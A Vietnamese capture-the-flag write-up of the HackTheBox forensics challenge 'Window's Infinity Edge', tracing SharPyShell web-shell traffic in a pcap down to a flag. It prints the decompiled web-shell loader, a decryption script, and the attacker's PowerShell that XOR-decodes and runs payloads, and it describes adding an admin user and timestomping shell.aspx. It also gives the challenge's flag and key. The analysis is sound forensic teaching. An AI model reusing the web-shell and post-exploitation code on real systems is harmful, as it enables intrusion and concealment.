Window's Infinity Edge
====

Lưu ý: đây là cách mình đã suy nghĩ xuyên suốt cả bài cho tới khi tìm thấy flag, nếu mọi người muốn nhanh gọn lẹ thì hãy nhảy tới TLDR giúp mình, mình xin cảm ơn 
<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/55b7fbfb-be07-4415-a477-ee118f6d3d60">
</p>


**Link tải file:** [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/hackthebox/Window's%20Infinity%20Edge/Others/2019-11-12_21_00_30-EXT07.pcap)

Download file đề về thì ta có một file capture bằng `wireshark`. Mở ra phân tích trong file `pcap` có gì  thì ta thấy nó các gói giao thức `HTTP`.


<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/e4b33726-a3e9-47f4-8d84-139be91a2184">
</p>

Trace vào bên trong các `TCP stream` của các gói `HTTP` thì ta thấy được có một hàm được viết bằng `sharpyshell` dành cho web được viết dưới cho `ASP.NET`. Bạn có thể xem [tại đây](https://github.com/antonioCoco/SharPyShell)

**Bạn có thể xem TCP stream đó** [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/hackthebox/Window's%20Infinity%20Edge/Others/Sharpy.aspx)

Phân tích Source code ta có thể thấy như sau: 

- Biến `r` sẽ giữ request gửi lên 
- Biến `int_arr` và `int_arr_r` sẽ được sử dụng trong vòng for và sau đó sẽ được sử dụng với hàm `Assembly.load`. Sau đó sẽ thực hiện hàm `Invoke` và trả về server.

Sau khi biết được nguyên lý hoạt động của đoạn code. Vì nưhu trên, biến `int_arr` và `int_arr_r` được sử dụng trong method `Invoke` nên bây giờ chúng ta sẽ dump nó ra để xem trong đó có gì. 

**Đoạn code bạn có thể xem** [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/hackthebox/Window's%20Infinity%20Edge/Others/Deocde%20exe.cs)

Sau khi ra được file, ta sẽ kiểm tra bằng `HxD` và ta có kết quả đây là một đầu header file `exe`

<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/69fc27a8-b329-4242-a53a-7a2d82b39269">
</p>

Sau đó bỏ vào các công cụ phân tích như `DIE` thì thấy rằng đây là một file `.NET`

<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/0edeced3-0523-4ee0-8be2-ee12b9df5689">
</p>

Giờ chỉ cần bỏ vào `DNSpy` hoặc `ILSpy` để phân tích tiếp.

```C#
public string Run(string code, string password)
{
	byte[] key = this.ConvertHexStringToByteArray(password);
	byte[] iv = new byte[]
	{
		105,
		110,
		102,
		105,
		110,
		105,
		116,
		121,
		95,
		101,
		100,
		103,
		101,
		104,
		116,
		98
	};
	string result = "";
	if (code != null)
	{
		byte[] encrypted = Convert.FromBase64String(code);
		byte[] bytes = this.AESDec(encrypted, key, iv);
		string @string = Encoding.UTF8.GetString(bytes);
		object obj = new object();
		CompilerResults compilerResults = null;
		try
		{
			CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider();
			compilerResults = csharpCodeProvider.CompileAssemblyFromSource(new CompilerParameters
			{
				GenerateInMemory = true,
				GenerateExecutable = false,
				ReferencedAssemblies = 
				{
					"System.dll"
				}
			}, new string[]
			{
				@string
			});
			object obj2 = compilerResults.CompiledAssembly.CreateInstance("SharPyShell");
			MethodInfo method = obj2.GetType().GetMethod("ExecRuntime");
			obj = method.Invoke(obj2, null);
		}
		catch (Exception ex)
		{
			string text = ex.ToString() + "\n\n{{{SharPyShellError}}}";
			for (int i = 0; i < compilerResults.Errors.Count; i++)
			{
				text = text + i.ToString() + ": " + compilerResults.Errors[i].ToString();
			}
			obj = Encoding.UTF8.GetBytes(text);
		}
		byte[] inArray = this.AESEnc((byte[])obj, key, iv);
		string text2 = Convert.ToBase64String(inArray);
		result = text2;
	}
	return result;
}
```

Nhìn vào đoạn code trên thì ta có thể thấy đây là một đoạn mã hoá `AES` đơn giản, nhận vào hai tham số là `code` và `password`.

- Biến `password` được đùng dể làm key
- `iv` đã được cho sẵn từ trước
- Biến `code` được encode`AES` và sau đó được `base64` lên và sau đó được trả về dưới biến `result`.

Vì thế chúng ta có thể thấy là server trên Wireshark trả về cho chúng ta đoạn mã `base64` chính là do đoạn thực thi này trả về. 

Khi biết được luồng chương trình hoạt động thì mình đã bắt đầu viết một đoạn script nhỏ có thể decrypt được communication bên trong `wireshark`.

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

iv = b"infinity_edgehtb"
key = bytes.fromhex("4d65bdbad183f00203b1e80cf96fba549663dabeab12fab153a921b346975cdd")
def decrypt(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext
i1 = 0
with open('http.txt','r') as f:  
    for i in  f.readlines():
      try:
        encrypted = base64.b64decode(bytes.fromhex(i).decode())
        with open(f'/home/kali/Desktop/decrypt/{i1}.cs', 'wb') as f1:
          f1.write(decrypt(encrypted, key, iv))
        # print(decrypt(encrypted, key, iv))
        i1+=1
      except:
        continue 
```

Sau khi decrypt được các file `c#` communication thì chúng ta sẽ phân tích qua các file đó.

Các bạn có thể xem full file [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/tree/main/hackthebox/Window's%20Infinity%20Edge/Others/SHELL%20SCRIPT%20FILE)

Vì không muốn quá dài dòng, nên mình chỉ nói những hành động chính mà `attacker` làm trên máy của `nạn nhân`. 

- Upload một file có tên là `tbyjzt4vw6y` tại các file `9,10,11,12,13,14.cs`
- Upload một file có tên là `3186q1r3kpvk` tại file `16.cs`
- Tại file số `17` ta có thể thấy dược tác giả đã sử dụng một đoạn `powershell` dùng để `decrypt` với `xor`  như sau:
```powershell
	$ProgressPreference = "SilentlyContinue";
	$path_in_module="C:\Windows\Temp\x1fvogijp5pyzn7\tbyjzt4vw6y";2
	$path_in_app_code="C:\Windows\Temp\x1fvogijp5pyzn7\3186q1r3kpvk";
	$key=[System.Text.Encoding]::UTF8.GetBytes('4d65bdbad183f00203b1e80cf96fba549663dabeab12fab153a921b346975cdd');
	$enc_module=[System.IO.File]::ReadAllBytes($path_in_module);
	$enc_app_code=[System.IO.File]::ReadAllBytes($path_in_app_code);
	$dec_module=New-Object Byte[] $enc_module.Length;
	$dec_app_code=New-Object Byte[] $enc_app_code.Length;
	for ($i = 0; $i -lt $enc_module.Length; $i++) {
		$dec_module[$i] = $enc_module[$i] -bxor $key[$i % $key.Length];
	};
	for ($i = 0; $i -lt $enc_app_code.Length; $i++) {
		$dec_app_code[$i] = $enc_app_code[$i] -bxor $key[$i % $key.Length];
	};
	$dec_module=[System.Text.Encoding]::UTF8.GetString($dec_module);
	$dec_app_code=[System.Text.Encoding]::UTF8.GetString($dec_app_code);
	$($dec_module+$dec_app_code)|iex;
	Remove-Item -Path $path_in_app_code -Force 2>&1 | Out-Null;"
```

- Sau đó ở file số`18`, ta có thể thấy là nó sử dụng hàm `InjectShellcode` sử dụng `base64` kết hợp với `gzip` để decode ra một thành một file `shellcode` kết hợp với `parameter` cũng sử dụng `base64` và `gzip`. Nhìn sơ qua về đoạn `paramter` của file số 18 thì ta thấy rằng nó sử dụng một các command như trong hình như sau: 

<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/e7019cef-c5d9-4a90-bb51-9aff3417557f">
</p>

Nhìn sơ qua đoạn dầu thì ta có thể biết được là hacker đang sử dụng đoạn `parameter` có lẽ như là dùng để truy cập vào `notepad` dưới tên `9nu8w1q`. Sau đó nếu trỏ xuống bên dưới thì ta thấy được một số câu lệnh mà nó sử dụng bằng cmd như sau: 

<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/514623c6-9e22-4b33-a66d-134684172cc8">
</p>

- Add thêm một user mới thông qua câu lệnh `cmd` với tên là `infinity` với group là `admin`
- Sau đó thêm vào nội dung của file `xor.k` là `xGk89_Ew`

Sau đó tại file `20.cs` thục hiện lệnh `whoami`và ghi vào `C:\Windows\Temp\x1fvogijp5pyzn7\z73b9`. Trong trường hợp nếu xảy ra lỗi tguf sẽ được lưu vào dưới đường dẫn sau `C:\Windows\Temp\x1fvogijp5pyzn7\6p1q9tforulxt0`

Tại file `21.cs` sẽ tạo hai file từ vị trí `C:\Windows\Temp\infinity_edge` với các đường dẫn như sau: 
- C:\Windows\Temp\x1fvogijp5pyzn7\fnq6sghi4kqpu
- C:\Windows\Temp\x1fvogijp5pyzn7\6s1gcx6zzl         


Tiếp tục file `22.cs` nó sử dụng tiếp câu lệnh sử dụng `shellcode` nhưng lại không truyền vào một tham số nào cả.

Các file còn lại trong đó thì được tóm tắt llaij nhưu sau:
 
```powershell
#file 23: từ infinity_edge chuyển sang dir C:\inetpub\wwwroot\webapp
#file 26: 
$ProgressPreference = "SilentlyContinue";$(Get-Item C:\inetpub\wwwroot\webapp\shell.aspx).CreationTime = Get-Date ((Get-Item C:\inetpub\wwwroot\webapp\upload.aspx ).CreationTime)
#file 27:
$ProgressPreference = "SilentlyContinue";$(Get-Item C:\inetpub\wwwroot\webapp\shell.aspx).lastaccesstime = Get-Date ((Get-Item C:\inetpub\wwwroot\webapp\upload.aspx ).lastaccesstime)
#file 28:
$ProgressPreference = "SilentlyContinue";$(Get-Item C:\inetpub\wwwroot\webapp\shell.aspx).lastwritetime = Get-Date ((Get-Item C:\inetpub\wwwroot\webapp\upload.aspx ).lastwritetime)
```

Nhận thấy được file số 22 khá khả nghi khi load shellcode vào nhưng không sử dụng một `parameter` nào cả, vì thế chúng ta sẽ sử câu lệnh dump giống nhưu file `18` đã làm. Load vào `HXD`, để ý kỹ thì trong shellcode có nhận vào file 

<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/6c930ce4-38c7-4d0c-bdd5-f3697a2f16b7">
</p>

Nếu chúng ta lấy file đó mà đi `xor` với phần bên trong `xor.k`, xoá một số byte đầu tiên thì ta sẽ ra kết quả

<p align="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/5576623b-0601-4fb2-92fe-8d948f339d1a">
</p>

Hoặc có thể xem [tại đây](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'xGk89_Ew'%7D,'Standard',false)&input=8OjEAAAAQVFBUFJRVkgx0mVIi1JgSItSGEiLUiBIi3JQSA%2B3SkpNMclIMcCsPGF8AiwgQcHJDUEBweLtUkFRSItSIItCPEgB0GaBeBgLAnVui4CIAAAASIXAdGNIAdBQi0gYRItAIEkB0ONSSP/JQYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18UwDTCQIRTnRddhYRItAJEkB0GZBiwxIRItAHEkB0EGLBIhIAdBBWEFYXllaQVhBWUFaQVL/4FhBWVpIixLpU////11Ig%2BxASMdEJDAAAAAAx0QkKAAAAADHRCQgAwAAAEUxyUG4AQAAALoAAACASI2NaQEAAEG62vbaT//VSIlEJEBIx0QkIAAAAABMjY1ZAQAAQbgIAAAASI2VYQEAAEiLTCRAQbqtnl%2B7/9VIi0wkQEG6xpaHUv/VSIuFYQEAALkQAAAASI2VcgEAAEgxAkiDwgji9%2BsZAAAAAAAAAAAAAAAAAAAAAGM6XHhvci5rAJNRMgnrHv9G8yjsx%2BwXdL45/Sa5IvW6opCilMfGPCgTViITXRlwJlcdJANXGRcRNQMBWlYNMykOJz5bTWY8N0cLNFhcZistRCciD18KfjhXRmcoAmUoLBkcKBxLZSsgGggbAlZfNiseDD40XV04ICseKwpfFys9A3g)

Sở dĩ phải xoá một số byte trong shellcode tại vì shellcode này giống như là một đoạn code assembly. Và trong đó một hàm được gọi là hàm Xor. Khi xoá đi một số byte đầu thì vô tình làm cho nó xor về được `flag`.

### Flag: HTB{F1n4lly_y0u_cr0ss3d_th3_edg3!}


